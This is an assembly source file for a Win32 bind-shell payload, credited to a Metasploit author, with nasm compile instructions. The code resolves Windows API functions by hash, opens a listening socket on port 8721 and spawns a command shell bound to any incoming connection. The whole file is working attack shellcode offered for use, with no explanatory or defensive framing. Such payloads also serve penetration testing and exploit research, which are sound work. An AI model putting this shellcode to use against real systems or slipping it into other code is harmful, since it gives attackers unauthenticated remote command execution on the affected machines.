;      Title:  Win32 Bind Shell
;  Platforms:  Windows NT 4.0, Windows 2000, Windows XP, Windows 2003
;   Function:  Listen for connection and spawn command shell
;     Author:  hdm[at]metasploit.com

; Compile: nasm -f bin -o win32_bind.bin win32_bind.asm


[BITS 32]

global _start

_start:

LCaller:
    call LLoadFunctions

LDataSegment:
;========================

dd "CMD"

dd 0x79c679e7 ; closesocket             12
dd 0x498649e5 ; accept                  16
dd 0xe92eada4 ; listen                  20
dd 0xc7701aa4 ; bind                    24
dd 0xadf509d9 ; WSASocketA              28
dd 0x3bfcedcb ; WSAStartup              32

dd 0xec0e4e8e ; LoadLibraryA            36
dd 0x73e2d87e ; ExitProcess             40
dd 0xce05d9ad ; WaitForSingleObject     44
dd 0x16b3fe72 ; CreateProcessA          48

db "WS2_32.DLL", 0x00, 0x01
;========================

LLoadFunctions:
    pop ebx
    push esp
	mov ebp, esp
    mov [ebp], ebx

LKernel32Base:
    push byte 0x30
    pop ecx
    mov eax, [fs:ecx]
	mov eax, [eax + 0x0c]
	mov esi, [eax + 0x1c]
	lodsd
	mov ebx, [eax + 0x08]
    jmp short LStartLoading

LLoadWinsock:
    lea edx, [edi + 44] ; get address of ws2_32.dll
    push ecx            ; save counter
    push edx            ; push address of ws2_32.dll
	call eax            ; LoadLibraryA()
    mov ebx, eax        ; save module handle
    pop ecx             ; restore counter
    jmp short Looper2

LStartLoading:
    ; Start loading addresses at ebp + 12
    push byte 0x08
    pop esi
    add esi, ebp

    ; Function counter
    push byte 0x0a
    pop ecx
    mov edi, [ebp]

Looper:
    cmp cl, 0x06
    je short LLoadWinsock

Looper2:
    push ecx                    ; save the counter
    push ebx                    ; dll handle
    push dword [edi + ecx*4]    ; function hash value
    call LGetProcAddress        ; find the address
    pop ecx                     ; restore the counter
    mov [esi + ecx * 4], eax    ; stack segment to store addresses
    loop Looper
	xor edi, edi

LWSAStartup:
	; WSAStartup(0x101, DATA)
    sub sp, 400
	push esp
	push 0x101
	call [ebp + 32]

LWSASocketA:
	; WSASocketA(2,1,0,0,0,0)
	push edi
	push edi
	push edi
	push edi
	inc edi
	push edi
	inc edi
	push edi
	call [ebp + 28]
	mov ebx, eax                ; save socket to ebx
    xor edi, edi

LBind:
	push edi
	push edi
	push dword 0x11220002 ; port 8721
	mov esi, esp
	push byte 0x10        ; length
	push esi
	push ebx
	call [ebp + 24]

LListen:
	push edi
	push ebx
	call [ebp + 20]

LAccept:
	push edi
	push esi
	push ebx
	call [ebp + 16]
	mov edx, eax

LCreateProcessStructs:
	; allocate space for STARTUPINFO, PROCESS_INFORMATION
	sub sp, 0x54

	; zero out SI/PI
	lea edi, [esp]
	xor eax, eax
    push byte 21
    pop ecx

LBZero:
	rep stosd

    mov edi, edx
	mov byte [esp + 16], 68	 ; si.cb = sizeof(si)
	inc byte [esp + 61]		 ; si.dwFlags = 0x100

	; socket handles
	mov [esp + 16 + 56], edi
	mov [esp + 16 + 60], edi
	mov [esp + 16 + 64], edi

	lea eax, [esp + 16]	; si
	push esp			; pi
	push eax
	push ecx
	push ecx
	push ecx

    inc ecx
	push ecx
    dec ecx

	push ecx
	push ecx
	push dword [ebp]
	push ecx

LCreateProcess:
	call [ebp + 48]
	mov ecx, esp

LWaitForSingleObject:
    push 0xFFFFFFFF
    push dword [ecx]
    call [ebp + 44]

LCloseSocket:
    push edi
    call [ebp + 12]

LFinished:
    call [ebp + 40]

LGetProcAddress:
	push ebx
	push ebp
	push esi
	push edi
	mov ebp, [esp + 24]
	mov eax, [ebp + 0x3c]
	mov edx, [ebp + eax + 120]
	add edx, ebp
	mov ecx, [edx + 24]
	mov ebx, [edx + 32]
	add ebx, ebp

LFnlp:

	jecxz	LNtfnd
	dec ecx
	mov esi, [ebx + ecx * 4]
	add esi, ebp
	xor edi, edi
	cld

LHshlp:

	xor eax, eax
	lodsb
	cmp al, ah
	je LFnd
	ror edi, 13
	add edi, eax
	jmp short LHshlp

LFnd:

	cmp edi, [esp + 20]
	jnz LFnlp
	mov ebx, [edx + 36]
	add ebx, ebp
	mov cx, [ebx + 2 * ecx]
	mov ebx, [edx + 28]
	add ebx, ebp
	mov eax, [ebx + 4 * ecx]
	add eax, ebp
	jmp short LDone

LNtfnd:
	xor eax, eax

LDone:
	mov edx, ebp
	pop edi
	pop esi
	pop ebp
	pop ebx
	ret 8